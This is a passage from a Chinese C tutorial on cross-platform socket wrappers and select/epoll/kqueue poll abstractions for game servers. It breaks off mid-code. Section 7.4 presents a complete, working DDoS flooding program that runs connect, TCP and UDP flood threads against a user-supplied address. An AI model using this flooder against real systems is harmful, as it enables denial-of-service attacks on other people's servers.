```

    随后将会详细剖析其中接口, 这些接口真的是服务器研发升级的必备技能. 也是很多人忘了,
    但他就是金丹期的一个见证或者说试炼卡. 

### 7.3.3 socket_xxxx 都将水落石出

    首先看第一缕实现, 每一次突破(踩坑)都是血与泪.

```C
inline socket_t
socket_dgram(void) {
    return socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
}

inline socket_t
socket_stream(void) {
    return socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
}

inline int
socket_close(socket_t s) {
    shutdown(s, SHUT_WR);
#ifdef _MSC_VER
    return closesocket(s);
#else
    return close(s);
#endif
}

inline int 
socket_read(socket_t s, void * data, int sz) {
#ifdef _MSC_VER
    return sz > 0 ? recv(s, data, sz, 0) : 0;
#else
    // linux上面 read 封装了 recv
    return read(s, data, sz);
#endif
}

inline int 
socket_write(socket_t s, const void * data, int sz) {
#ifdef _MSC_VER
    return send(s, data, sz, 0);
#else
    return write(s, data, sz);
#endif
}

int 
socket_addr(const char * ip, uint16_t port, sockaddr_t * addr) {
    if (!ip || !*ip || !addr)
        RETURN(ErrParam, "check empty ip = %s, port = %hu, addr = %p.", ip, port, addr);

    addr->sin_family = AF_INET;
    addr->sin_port = htons(port);
    addr->sin_addr.s_addr = inet_addr(ip);
    if (addr->sin_addr.s_addr == INADDR_NONE) {
        struct hostent * host = gethostbyname(ip);
        if (!host || !host->h_addr)
            RETURN(ErrParam, "check ip is error = %s.", ip);
        // 尝试一种, 默认ipv4
        memcpy(&addr->sin_addr, host->h_addr, host->h_length);
    }
    memset(addr->sin_zero, 0, sizeof addr->sin_zero);

    return SufBase;
}
```
    
    不知道看完 socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP); 有什么话说, 这就是逼
    格. PF_INET 用于声明套接字类型. AF_INET 用于 socket 地址类型. 值一样, 设计意
    图不一样. 第三个参数有点装, 最通用的写法用0代替, 走默认第一个. 其中对于
    socket_close 底层默认采用了优雅的关闭, shutdown 等待服务器所有数据写完毕. 这
    也是 SHUT_WR 宏 winds 实现的意义. 再看 socket_read 的时候, 不知道你是否好奇.
    因为 winds 和 linux 对于 recv 处理非法输入的行为不一样. linux sz = 0 会立即
    返回, 但是 winds 会阻塞住, 算是 winds 一个 bug 吧, 它可能没有检查直接抛入到发
    送层面造成互相等待阻塞了. 我们其实讲了很多, 但你会发现学的很快. 主要原因是我们
    从实践剑宗出发, 快速战斗, 但缺少底蕴. 用的快, 忘记的快, 真真的前辈, 一定是气宗,
    一个绝顶高手一定是剑宗出 ~ 万众五一

    再来看看相关辅助操作, 用于 socket 一些控住操作.

```C
inline int
socket_set_block(socket_t s) {
#ifdef _MSC_VER
    u_long mode = 0;
    return ioctlsocket(s, FIONBIO, &mode);
#else
    int mode = fcntl(s, F_GETFL, 0);
    if (mode == SOCKET_ERROR)
	    return SOCKET_ERROR;
    if (mode & O_NONBLOCK)
	    return fcntl(s, F_SETFL, mode & ~O_NONBLOCK);
    return SufBase;
#endif	
}

inline int
socket_set_nonblock(socket_t s) {
#ifdef _MSC_VER
    u_long mode = 1;
    return ioctlsocket(s, FIONBIO, &mode);
#else
    int mode = fcntl(s, F_GETFL, 0);
    if (mode == SOCKET_ERROR)
	    return SOCKET_ERROR;
    if (mode & O_NONBLOCK)
	    return SufBase;
    return fcntl(s, F_SETFL, mode | O_NONBLOCK);
#endif	
}

static inline int _socket_set_enable(socket_t s, int optname) {
    int ov = 1;
    return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
}

inline int
socket_set_reuseaddr(socket_t s) {
    return _socket_set_enable(s, SO_REUSEADDR);
}

inline int 
socket_set_keepalive(socket_t s) {
    return _socket_set_enable(s, SO_KEEPALIVE);
}

static inline int _socket_set_time(socket_t s, int ms, int optname) {
    struct timeval ov = { 0,0 };
    if (ms > 0) {
	    ov.tv_sec = ms / 1000;
	    ov.tv_usec = (ms % 1000) * 1000;
    }
    return setsockopt(s, SOL_SOCKET, optname, (void *)&ov, sizeof ov);
}

inline int
socket_set_recvtimeo(socket_t s, int ms) {
    return _socket_set_time(s, ms, SO_RCVTIMEO);
}

inline int
socket_set_sendtimeo(socket_t s, int ms) {
    return _socket_set_time(s, ms, SO_SNDTIMEO);
}
```

    无外乎围绕 非阻塞, 阻塞 IO 设置, 地址复用, 开启 socket 底层心跳机制...
    其中最喜欢接口如下:

```C
inline int 
socket_get_error(socket_t s) {
    int error;
    socklen_t len = sizeof(error);
    int code = getsockopt(s, SOL_SOCKET, SO_ERROR, (void *)&error, &len);
    return code < 0 ? errno : error;
}
```

    得到 socket 一次操作后的错误信息. 是不是很花心思. 有了它是否瞬间感觉, 一路
    飞云逐日 ~

    随后对于发送和接收模块, 很大众的思路, 只不过加了一些信号中断的判断.

```C
int
socket_recv(socket_t s, void * buf, int len) {
    int r;
    do {
	    r = recv(s, buf, len, 0);
    } while (r == SOCKET_ERROR && errno == EINTR);
    return r;
}

int
socket_recvn(socket_t s, void * buf, int len) {
    int r, nlen = len;
    while (nlen > 0) {
	    r = socket_recv(s, buf, nlen);
	    if (r == 0) break;
	    if (r == SOCKET_ERROR) {
		    RETURN(SOCKET_ERROR, "socket_recv error len = %d, nlen = %d.", len, nlen);
	    }
	    nlen -= r;
	    buf = (char *)buf + r;
    }
    return len - nlen;
}

int
socket_send(socket_t s, const void * buf, int len) {
    int r;
    do {
	    r = send(s, buf, len, 0);
    } while (r == SOCKET_ERROR && errno == EINTR);
    return r;
}

int
socket_sendn(socket_t s, const void * buf, int len) {
    int r, nlen = len;
    while (nlen > 0) {
	    r = socket_send(s, buf, nlen);
	    if (r == 0) break;
	    if (r == SOCKET_ERROR) {
		    RETURN(SOCKET_ERROR, "socket_send error len = %d, nlen = %d.", len, nlen);
	    }
	    nlen -= r;
	    buf = (const char *)buf + r;
    }
    return len - nlen;
}

inline int
socket_recvfrom(socket_t s, void * buf, int len, int flags, sockaddr_t * in, socklen_t * inlen) {
    return recvfrom(s, buf, len, flags, (struct sockaddr *)in, inlen);
}

inline int
socket_sendto(socket_t s, const void * buf, int len, int flags, const sockaddr_t * to, socklen_t tolen) {
    return sendto(s, buf, len, flags, (const struct sockaddr *)to, tolen);
}
```

    还是那句话, 山中不知岁月. 其实本文很多套路都是从一个叫云风的化神前辈遗留下剑气中, 
    参悟得到的. 最终交叉在华山剑法中, 供后来者思索或演练基础.

```C
socket_t
socket_bind(const char * host, uint16_t port, uint8_t protocol, int * family) {
    socket_t fd;
    char ports[sizeof "65535"];
    struct addrinfo hints = { 0 };
    struct addrinfo * ailist = NULL;
    if (host == NULL || *host == 0)
	    host = "0.0.0.0"; // INADDR_ANY

    sprintf(ports, "%hu", port);
    hints.ai_family = AF_UNSPEC;
    if (protocol == IPPROTO_TCP)
	    hints.ai_socktype = SOCK_STREAM;
    else {
	    assert(protocol == IPPROTO_UDP);
	    hints.ai_socktype = SOCK_DGRAM;
    }
    hints.ai_protocol = protocol;

    if (getaddrinfo(host, ports, &hints, &ailist))
	    return INVALID_SOCKET;

    fd = socket(ailist->ai_family, ailist->ai_socktype, 0);
    if (fd == INVALID_SOCKET)
	    goto _failed_fd;

    if (socket_set_reuseaddr(fd))
	    goto _failed;

    if (bind(fd, ailist->ai_addr, (int)ailist->ai_addrlen))
	    goto _failed;
    // Success return ip family
    if (family)
	    *family = ailist->ai_family;

    freeaddrinfo(ailist);
    return fd;

_failed:
    socket_close(fd);
_failed_fd:
    freeaddrinfo(ailist);
    return INVALID_SOCKET;
}

socket_t
socket_listen(const char * host, uint16_t port, int backlog) {
    socket_t fd = socket_bind(host, port, IPPROTO_TCP, NULL);
    if (fd == INVALID_SOCKET)
	    return INVALID_SOCKET;

    if (listen(fd, backlog)) {
	    socket_close(fd);
	    return INVALID_SOCKET;
    }
    return fd;
}
```

    这里 socket_bind 能够绑定一个 host 主机地址. 不仅仅是 ip 地址, 同样包括 url 地
    址. 上面两个接口属于半成品接口, 用于各种其它接口的扩展内嵌部分. socket_bind 函数
    业务能力很强. 实现也是四平八稳. 对于后面使用的 listen 函数, backlog 参数决定
    accept 监测过来的链接套接字队列大小. listen 开启的监听队列内部也有个限定值. 只是
    参考你设置 backlog 是否采纳看系统实现. 所以有了下面一坨封装

```C
inline socket_t
socket_tcp(const char * host, uint16_t port) {
    socket_t s = socket_listen(host, port, SOMAXCONN);
    if (INVALID_SOCKET == s) {
	    RETURN(INVALID_SOCKET, "socket_listen socket error!");
    }
    return s;
}

inline socket_t
socket_udp(const char * host, uint16_t port) {
    socket_t s = socket_bind(host, port, IPPROTO_UDP, NULL);
    if (INVALID_SOCKET == s) {
	    RETURN(INVALID_SOCKET, "socket_bind socket error!");
    }
    return s;
}
```

    随后为基础 socket connect 和 accept 封装一下

```C
inline socket_t
socket_accept(socket_t s, sockaddr_t * addr) {
    socklen_t len = sizeof (sockaddr_t);
    return accept(s, (struct sockaddr *)addr, &len);
}

inline int
socket_connect(socket_t s, const sockaddr_t * addr) {
    return connect(s, (const struct sockaddr *)addr, sizeof(*addr));
}

inline int
socket_connects(socket_t s, const char * ip, uint16_t port) {
    sockaddr_t addr;
    int r = socket_addr(ip, port, &addr);
    if (r < SufBase)
	    return r;
    return socket_connect(s, &addr);
}
```

**客户端核心, 非阻塞的 connect**

    winds 的 select 和 linux 的 select 是两个完全不同的东西. 然而凡人喜欢把
    它们揉在一起. 非阻塞的 connect 业务是个自带超时机制的 connect. 实现机制无
    外乎利用select(也有 epoll的). 这里是个源码软文, 专注解决客户端的跨平台的
    connect 问题. 服务器的 connect 要比客户端多考虑一丁点(放入总轮序器中处理)
    . 有机会再扯. 对于 select 网上资料太多, 几乎都有点不痛不痒. 了解真相推荐
    man and msdn !!!

    那开始吧. 有了上面那些关于跨平台的 socket 封装铺垫. 理解下面的非阻塞 
    connect 都是小意思.

```C
int
socket_connecto(socket_t s, const sockaddr_t * addr, int ms) {
    int n, r;
    struct timeval to;
    fd_set rset, wset, eset;

    // 还是阻塞的connect
    if (ms < 0) return socket_connect(s, addr);

    // 非阻塞登录, 先设置非阻塞模式
    r = socket_set_nonblock(s);
    if (r < SufBase) {
	    RETURN(r, "socket_set_nonblock error!");
    }

    // 尝试连接一下, 非阻塞connect 返回 -1 并且 errno == EINPROGRESS 表示正在建立链接
    r = socket_connect(s, addr);
    if (r >= SufBase) goto _return;

    // 链接还在进行中, linux这里显示 EINPROGRESS，winds应该是 WASEWOULDBLOCK
    if (errno != ECONNECTED) {
	    CERR("socket_connect error r = %d!", r);
	    goto _return;
    }

    // 超时 timeout, 直接返回结果 ErrBase = -1 错误
    r = ErrBase;
    if (ms == 0) goto _return;

    FD_ZERO(&rset); FD_SET(s, &rset);
    FD_ZERO(&wset); FD_SET(s, &wset);
    FD_ZERO(&eset); FD_SET(s, &eset);
    to.tv_sec = ms / 1000;
    to.tv_usec = (ms % 1000) * 1000;
    n = select((int)s + 1, &rset, &wset, &eset, &to);
    // 超时直接滚
    if (n <= 0) goto _return;

    // 当连接成功时候,描述符会变成可写
    if (n == 1 && FD_ISSET(s, &wset)) {
	    r = SufBase;
	    goto _return;
    }

    // 当连接建立遇到错误时候, 描述符变为即可读又可写
    if (FD_ISSET(s, &eset) || n == 2) {
	    socklen_t len = sizeof n;
	    // 只要最后没有 error那就 链接成功
	    if (!getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&n, &len) && !n)
		    r = SufBase;
    }

_return:
    socket_set_block(s);
    return r;
}
```

    核心在于 select 调用触发的异常问题上. 还有 errno 信号的判断差异. 最后来个
    封装实战扩展版本

```C
socket_t
socket_connectos(const char * host, uint16_t port, int ms) {
    int r;
    sockaddr_t addr;
    socket_t s = socket_stream();
    if (s == INVALID_SOCKET) {
	    RETURN(INVALID_SOCKET, "socket_stream is error!");
    }

    // 构建ip地址
    r = socket_addr(host, port, &addr);
    if (r < SufBase)
	    return r;

    r = socket_connecto(s, &addr, ms);
    if (r < SufBase) {
	    socket_close(s);
	    RETURN(INVALID_SOCKET, "socket_connecto host port ms = %s, %u, %d!", host, port, ms);
    }

    return s;
}
```

    当你的客户端, 想和服务器开始通信, 只需要调用 socket_connectos(host, port, ms)
    后面就可以等待它的回音. 是不是很简单, 一切都妥了. 到这里也许你应该是个合格码农了. 
    因为基础功底修炼的有些火苗了, 后面的实践也许更加真实, 或者简单. 
    又或许是 ......

![藤原佐为](./img/藤原佐为.jpg)

## 7.4 金丹演练, 来个阅读理解吧.

    有了上面关于跨平台的 socket 封装, 不妨写个简单的测试 demo. 很多同学也许会遇到
    ddos 攻击(流量攻击导致网卡超载, 服务器拒绝服务) . 其实攻击原理很简单, 对服务器
    暴露在外的地址和端口疯狂发送流量包. 我们阅读理解的思路, 很简单疯狂 connect, 
    疯狂 write , 统计下数据看最终效果怎么样 ~

```C
#include "scsocket.h"

#define _INT_HOST   (255)	
#define _INT_TOUT   (3000)

struct targ {
    sockaddr_t addr;
    char ts[BUFSIZ];
    char us[BUFSIZ];

    // 攻击次数统计
    uint64_t connect;
    uint64_t tcpsend;
    uint64_t udpsend;
};

// 得到玩家输入的地址信息
void addr_input(sockaddr_t * addr);

// 检查IP是否合法
bool addr_check(sockaddr_t * addr);

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void ddos_run(struct targ * arg);

//
// ddos attack entrance
//
int main(void) {
    // 记录详细攻击的量, ts and us 是脏数据随便发
    struct targ arg;
    arg.udpsend = arg.tcpsend = arg.connect = 0;

    // 得到玩家的地址信息
    addr_input(&arg.addr);

    if (!addr_check(&arg.addr))
	    CERR_EXIT("ip or port check is error!!!");

    // 开始要启动线程了
    ddos_run(&arg);

    // :> 开始统计数据
    puts("connect count		tcp send count			udp send count");
    for (;;) {
	    printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
            , arg.connect, arg.tcpsend, arg.udpsend);
	    sh_msleep(_INT_TOUT);
    }
    return EXIT_SUCCESS;
}

// 得到玩家输入的地址信息
void
addr_input(sockaddr_t * addr) {
    bool flag = true;
    int rt = 0;
    uint16_t port;
    char ip[_INT_HOST + 1] = { 0 };

    puts("Please input ip and port, example :> 127.0.0.1 8088");
    printf(":> ");

    // 自己重构scanf, 解决注入漏洞
    while (rt < _INT_HOST) {
	    char c = getchar();
	    if (isspace(c)) {
		    if (flag)
			    continue;
		    break;
	    }
	    flag = false;
	    ip[rt++] = c;
    }
    ip[rt] = '\0';

    rt = scanf("%hu", &port);
    if (rt != 1)
	    CERR_EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);

    printf("connect check input addr ip:port = %s:%hu.\n", ip, port);

    // 下面就是待验证的地址信息
    if (socket_addr(ip, port, addr) < SufBase)
	    CERR_EXIT("socket_addr ip , port is error = %s, %hu.", ip, port);
}

// 检查IP是否合法
bool
addr_check(sockaddr_t * addr) {
    int r;
    socket_t s = socket_stream();
    if (s == INVALID_SOCKET) {
	    RETURN(false, "socket_stream is error!!");
    }

    r = socket_connecto(s, addr, _INT_TOUT);
    socket_close(s);
    if (r < SufBase) {
	    RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
    }

    return true;
}

// connect 链接
static void _connect(struct targ * targ) {
    // 疯狂connect
    for (;;) {
	    socket_t s = socket_stream();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 精确统计, 一定要连接成功
	    while (socket_connect(s, &targ->addr) < SufBase)
		    ;

	    ++targ->connect;
	    socket_close(s);
    }
}

// connect + send 连接
static void _tcpsend(struct targ * targ) {
    // 疯狂connect
    for (;;) {
	    socket_t s = socket_stream();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 精确统计, 一定要连接成功
	    while (socket_connect(s, &targ->addr) < SufBase)
		    ;

	    // 疯狂发送数据包
	    while (socket_send(s, targ->ts, BUFSIZ) >= SufBase)
		    ++targ->tcpsend;

	    socket_close(s);
    }
}

// udp send 连接
static void _udpsend(struct targ * targ) {
    for (;;) {
	    socket_t s = socket_dgram();
	    if (s == INVALID_SOCKET) {
		    CERR("socket_stream is error!");
		    continue;
	    }

	    // 疯狂发送数据包
	    while (socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr, sizeof(targ->addr)) >= SufBase)
		    ++targ->udpsend;

	    socket_close(s);
    }
}

// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
void
ddos_run(struct targ * arg) {
    // 创建两个 connect 线程
    CERR_IF(async_run(_connect, arg));
    CERR_IF(async_run(_connect, arg));

    // 创建两个 connect + send 线程
    CERR_IF(async_run(_tcpsend, arg));
    CERR_IF(async_run(_tcpsend, arg));

    // 创建两个 udp send 线程
    CERR_IF(async_run(_udpsend, arg));
    CERR_IF(async_run(_udpsend, arg));
}
```

    最终效果图

![ddos攻击](./img/ddos攻击.png)

    主要围绕 _connect, _tcpsend, _udpsend 三个业务展开. 关于 CERR_IF 和 async_run
    都是现代封装的便利操作. 只要你拥有足够的流量, 哪怕再小的枪都能让老师傅闻风丧胆. 这
    些都是妖魔战的绝招. 有兴趣可以朝着安全方面深入, 了解更加针对的操作系统知识. 这里主
    打游戏服务器中底层库构建, C 剑技上面修炼 ~

    到这强行突破金丹, 以后就是时间疯狂打磨. 十年磨一剑, 霜刃未曾试 ~
    原本关于 C 修炼到这里, 是完工了, 因为世间套路都抵不过时间, 用心去封装 ~

    也许再一次重新求索, 带上你的剑 ---88--

## 7.6 server poll 一股至强的气息

    很久以前幻想着能和那些 元婴大佬, 化神真君一样御剑飞行, 一步千里. (现在还在幻
    想) 偶幸得到一部元婴功法, 分享参悟, 说不定江湖中下次会留下你的传说 ~

    基于注册的套路, 真的和吃屎一样来回绕. 何必呢, 用的了那么纠缠吗. 倒不如从
    底层分层依次冒上来, 最终来个元气弹. 

    最后一招, 在这元气稀薄的大陆哈哈, 元婴灭世, ta 给你你要的一切 ~

### 7.6.1 server poll 文件描述符监测

    从 select , poll, epoll, iocp, kevent 这一切的一切到底经历过什么. 当然这
    些有着相似的接口, 何不一块来个接口统一封装呢. 这里有你满足的一切. 不妨看下面
    完整接口. 

```C
#ifndef _H_SIMPLEC_SOCKET_POLL
#define _H_SIMPLEC_SOCKET_POLL

#include "scsocket.h"

#ifdef _MSC_VER
typedef struct select_poll * poll_t;
#else
typedef int poll_t;		// * 也就大师背后, 拾人牙慧
#endif

struct event {
	void * s;
	bool read;
	bool write;
	bool error;
};

//
// sp_create	- 创建一个poll模型
// sp_invalid	- 检查这个poll模型是否有问题, true表示有问题
// sp_delete	- 销毁这个poll模型
//
extern poll_t sp_create(void);
extern bool sp_invalid(poll_t sp);
extern void sp_delete(poll_t sp);

//
// sp_add		- 添加监测的socket, 并设置读模式, 失败返回true
// sp_del		- 删除监测的socket
// sp_write		- 修改当前socket, 并设置为写模式
//
extern bool sp_add(poll_t sp, socket_t sock, void * ud);
extern void sp_del(poll_t sp, socket_t sock);
extern void sp_write(poll_t sp, socket_t sock, void * ud, bool enable);

//
// sp_wait		- poll 的 wait函数, 等待别人自投罗网
// sp		: poll 模型
// e		: 返回的操作事件集
// max		: e 的最大长度
// return	: 返回待操作事件长度, <= 0 表示失败
//
extern int sp_wait(poll_t sp, struct event e[], int max);

#endif // !_H_SIMPLEC_SOCKET_POLL
```

    首先明确一点, 这套库主打 unix / linux. 当初那个化神前辈只写了个 unix kevent, 
    linux epoll 部分. 后面为了方便 CL Debug 主动加了 winds select 实现. 方便测
    试监测. 
    
### 7.6.2 select 实现

    有了上面 socket_poll 接口定义, 我们开始搞起 ~
    先来个 winds 实现, 基于 select 按照上面接口标准设计出我们要的

socket_poll$select.h

```C
#if defined(_MSC_VER)

#include "socket_poll.h"

struct sevent {
	void * ud;
	bool write;
	socket_t fd;
};

struct select_poll {
	fd_set rsd;
	fd_set wsd;
	fd_set esd;
	uint16_t n;
	struct sevent evs[FD_SETSIZE];
};

inline poll_t 
sp_create(void) {
	return calloc(1, sizeof(struct select_poll));
}

inline bool 
sp_invalid(poll_t sp) {
	return NULL == sp;
}

inline void 
sp_delete(poll_t sp) {
	free(sp);
}

bool 
sp_add(poll_t sp, socket_t sock, void * ud) {
	struct sevent * sev, * eev;
	if (sp->n >= FD_SETSIZE)
		return true;

	sev = sp->evs;
	eev = sp->evs + sp->n;
	while (sev < eev) {
		if (sev->fd == sock)
			break;
		++sev;
	}
	if (sev == eev) {
		++sp->n;
		sev->fd = sock;
	}

	sev->ud = ud;
	sev->write = false;
	return false;
}

void 
sp_del(poll_t sp, socket_t sock) {
	struct sevent * sev = sp->evs, * eev = sp->evs + sp->n;
	while (sev < eev) {
		if (sev->fd == sock) {
			--sp->n;
			while (++sev < eev)
				sev[-1] = sev[0];
			break;
		}
		++sev;
	}
}

void 
sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
	struct sevent * sev = sp->evs, * eev = sp->evs + sp->n;
	while (sev < eev) {
		if (sev->fd == sock) {
			sev->ud = ud;
			sev->write = enable;
			break;
		}
		++sev;
	}
}

int 
sp_wait(poll_t sp, struct event e[], int max) {
	int r, i, n, retn;
	socklen_t len = sizeof r;
	FD_ZERO(&sp->rsd);
	FD_ZERO(&sp->wsd);
	FD_ZERO(&sp->esd);

	for (i = 0; i < sp->n; ++i) {
		struct sevent * sev = sp->evs + i;
		FD_SET(sev->fd, &sp->rsd);
		if (sev->write)
			FD_SET(sev->fd, &sp->wsd);
		FD_SET(sev->fd, &sp->esd);
	}

	n = select(0, &sp->rsd, &sp->wsd, &sp->esd, NULL);
	if (n <= 0)
		RETURN(n, "select n = %d", n);

	for (retn = i = 0; i < sp->n && retn < max && retn < n; ++i) {
		struct sevent * sev = sp->evs + i;
		e[retn].read = FD_ISSET(sev->fd, &sp->rsd);
		e[retn].write = sev->write && FD_ISSET(sev->fd, &sp->wsd);
		
		r = 1;
		if (FD_ISSET(sev->fd, &sp->esd)) {
			// 只要最后没有 error那就OK | 排除带外数据
			if (getsockopt(sev->fd, SOL_SOCKET, SO_ERROR, (char *)&r, &len) || r)
				r = 0;
		}

		// 保存最终错误信息
		if (e[retn].read || e[retn].write || !r) {
			e[retn].s = sev->ud;
			e[retn].error = !!r;
			++retn;
		}
	}
	return retn;
}

#endif
```

    核心在于 sp_wait 实现, 使用了 select 所有的参数. 核心看 sp->esd 用法加上了错误
    验证机制. 当你学习到这里我希望你能够明白这些代码的意义了. 因为不是个让你入门的解
    释. 而是让你理解了套路, 能够立即为线上框架贡献代码的思路.

### 7.6.3 epoll 实现

    其实这套接口最大的服务对象就是 linux 服务器. 所以 epoll 封装起来特别顺手. 核心
    很短

socket_poll$epoll.h

```C
#if defined(__linux__)

#include "socket_poll.h"
#include <sys/epoll.h>

inline poll_t 
sp_create(void) {
	return epoll_create1(0);
}

inline bool 
sp_invalid(poll_t sp) {
	return 0 > sp;
}

inline void 
sp_delete(poll_t sp) {
	close(sp);
}

inline bool 
sp_add(poll_t sp, socket_t sock, void * ud) {
	struct epoll_event ev = { EPOLLIN };
	ev.data.ptr = ud;
	return epoll_ctl(sp, EPOLL_CTL_ADD, sock, &ev) < 0;
}

inline void 
sp_del(poll_t sp, socket_t sock) {
	epoll_ctl(sp, EPOLL_CTL_DEL, sock, NULL);
}

inline void 
sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
	struct epoll_event ev;
	ev.events = EPOLLIN | (enable ? EPOLLOUT : 0);
	ev.data.ptr = ud;
	epoll_ctl(sp, EPOLL_CTL_MOD, sock, &ev);
}

int 
sp_wait(poll_t sp, struct event e[], int max) {
	struct epoll_event ev[max];
	int i, n = epoll_wait(sp, ev, max, -1);

	for (i = 0; i < n; ++i) {
		uint32_t flag = ev[i].events;
		e[i].s = ev[i].data.ptr;
		e[i].write = flag & EPOLLOUT;
		e[i].read = flag & (EPOLLIN | EPOLLHUP);
		e[i].error = flag & EPOLLERR;
	}

	return n;
}

#endif
```

    sp_wait -> epoll_wait 之后开始 read, write, error 判断. 其中对于 EPOLLHUP 解释
    是当 socket 的一端认为对方发来了一个不存在的4元组请求的时候, 会回复一个 RST 响应, 
    在 epoll 上会响应为 EPOLLHUP 事件, 目前查资料已知的两种情况会发响应 RST. 
        [1] 当客户端向一个没有在listen的服务器端口发送的connect的时候服务器会返回一个
            RST 因为服务器根本不知道这个4元组的存在 
        [2] 当已经建立好连接的一对客户端和服务器, 客户端突然操作系统崩溃, 或者拔掉电源
            导致操作系统重新启动(kill pid或者正常关机不行的, 因为操作系统会发送 FIN 给
            对方). 这时服务器在原有的4元组上发送数据, 会收到客户端返回的 RST, 因为客户
            端根本不知道之前这个4元组的存在
    这么做的原因是能够让下一次 read 返回 -1, 监测出 error, 走 close 操作.

### 7.6.4 kevent 实现

    对于 kevent unix poll 封装, 纯属复制. 没有亲自测试, 有兴趣的可以尝试使用.

socket_poll$kevent.h

```C
#if defined(__APPLE__) || defined(__FreeBSD__) || defined(__OpenBSD__) || defined (__NetBSD__)

#include "socket_poll.h"
#include <sys/event.h>

inline poll_t
sp_create(void) {
	return kqueue();
}

inline bool
sp_invalid(poll_t sp) {
	return 0 > sp;
}

inline void
sp_delete(poll_t sp) {
	close(sp);
}

bool
sp_add(poll_t sp, socket_t sock, void * ud) {
	struct kevent ke;
	EV_SET(&ke, sock, EVFILT_READ, EV_ADD, 0, 0, ud);
	if (kevent(sp, &ke, 1, NULL, 0, NULL) < 0 || ke.flags & EV_ERROR)
		return true;

	EV_SET(&ke, sock, EVFILT_WRITE, EV_ADD, 0, 0, ud);
	if (kevent(sp, &ke, 1, NULL, 0, NULL) < 0 || ke.flags & EV_ERROR) {
		EV_SET(&ke, sock, EVFILT_READ, EV_DELETE, 0, 0, NULL);
		kevent(sp, &ke, 1, NULL, 0, NULL);
		return true;
	}
	EV_SET(&ke, sock, EVFILT_WRITE, EV_DISABLE, 0, 0, ud);
	if (kevent(sp, &ke, 1, NULL, 0, NULL) < 0 || ke.flags & EV_ERROR) {
		sp_del(sp, sock);
		return true;
	}
	return false;
}

inline void
sp_del(poll_t sp, socket_t sock) {
	struct kevent ke;
	EV_SET(&ke, sock, EVFILT_READ, EV_DELETE, 0, 0, NULL);
	kevent(sp, &ke, 1, NULL, 0, NULL);
	EV_SET(&ke, sock, EVFILT_WRITE, EV_DELETE, 0, 0, NULL);
	kevent(sp, &ke, 1, NULL, 0, NULL);
}

void
sp_write(poll_t sp, socket_t sock, void * ud, bool enable) {
	struct kevent ke;
	EV_SET(&ke, sock, EVFILT_WRITE, enable ? EV_ENABLE : EV_DISABLE, 0, 0, ud);
	if (kevent(sp, &ke, 1, NULL, 0, NULL) < 0 || ke.flags & EV_ERROR) {
		// todo: check error
	}
}

int
sp_wait(poll_t sp, struct event e[], int max) {
	struct kevent ev[max];
	int i, n = kevent(sp, NULL, 0, ev, max, NULL);

	for (i = 0; i < n; ++i) {
		e[i].s = ev[i].udata;
		e[i].write = ev[i].filter == EVFILT_WRITE;
		e[i].read = ev[i].filter == EVFILT_READ;
		e[i].error = false;	// kevent has not error event
	}

	return n;
}

#endif
```

    到这里关于 socket_poll 模型在不同平台上已经实现了. 

socket_poll.c    

```C
#include "socket_poll$epoll.h"
#include "socket_poll$kevent.h"
#include "socket_poll$select.h"
```    

    到这里不妨写个测试 demo

### 7.6.5 poll demo

    不妨看下面, 监听 socket connect 过来, 

```C
#include "socket_poll.h"

#define _USHORT_PORT	(8088u)

//
// 参照云风的思路自己设计了 window 部分代码
// https://github.com/cloudwu/skynet/blob/master/skynet-src/socket_poll.h
//
int main(void) {
    int n;
    poll_t poll;
    socket_t sock;
    struct event evs[FD_SETSIZE];

    // 开始构建一个 socket
    sock = socket_tcp(NULL, _USHORT_PORT);
    if (sock == INVALID_SOCKET)
        return;

    poll = sp_create();
    assert(!sp_invalid(poll));

    if (sp_add(poll, sock, NULL))
        CERR("sp_add sock = is error!");
    else {
        // 开始等待数据
        printf("sp_wait [127.0.0.1:%hu] listen ... \n", _USHORT_PORT);
        n = sp_wait(poll, evs, LEN(evs));
        printf("sp_wait n = %d. 一切都是那么意外!\n", n);
    }

    sp_delete(poll);
    return socket_close(sock);
}
```

    test_socket_poll 只做了一件小事情, 开启 poll 监听等待一个东西过来. 随后就
    结束. 期间输出你所展现的数据.

![socket_poll](./img/socket_poll.png)

## 7.7 阅读理解 pipe

    网络 IO 我们自己写的时候, 高效的都是异步走的. 那么异步过程中需要控制的. 怎么
    管理呢. 有人想到需要有消息队列进行控制. 确实, 只不过这里用到了另一个小技巧. 采
    用 linux 匿名管道 pipe. 很巧妙. 不妨先移植到 winds 上面辅助测试.

```C
#if defined(_MSC_VER)

//
// pipe - 移植 linux函数, 通过 WinSock
// pipefd	: 索引0表示read, 1表示write
// return	: zero is error, -1 is returned
// 
extern int pipe(socket_t pipefd[2]);

#endif
```

    同样实现起来很简单, 利用的创建两个本地通信的 socket 进行处理. 

```C
int
pipe(socket_t pipefd[2]) {
	socket_t s;
	sockaddr_t name = { AF_INET };
	socklen_t nlen = sizeof name;
	name.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	// 开启一个固定 socket
	if ((s = socket_stream()) == INVALID_SOCKET) 
        return ErrBase;

	if (bind(s, (struct sockaddr *)&name, nlen) < 0)
        return socket_close(s), ErrBase;
	if (listen(s, SOMAXCONN) < 0) 
        return socket_close(s), ErrBase;

	// 得到绑定的数据
	if (getsockname(s, (struct sockaddr *)&name, &nlen) < 0)
        return socket_close(s), ErrBase;

	// 开始构建互相通信的socket
	if ((pipefd[0] = socket_stream()) == INVALID_SOCKET)
        return socket_close(s), ErrBase;

	if (socket_connect(pipefd[0], &name) < 0)
        return socket_close(s), ErrBase;

	// 可以继续添加, 通信协议来避免一些意外
	if ((pipefd[1] = socket_accept(s, &name)) == INVALID_SOCKET)
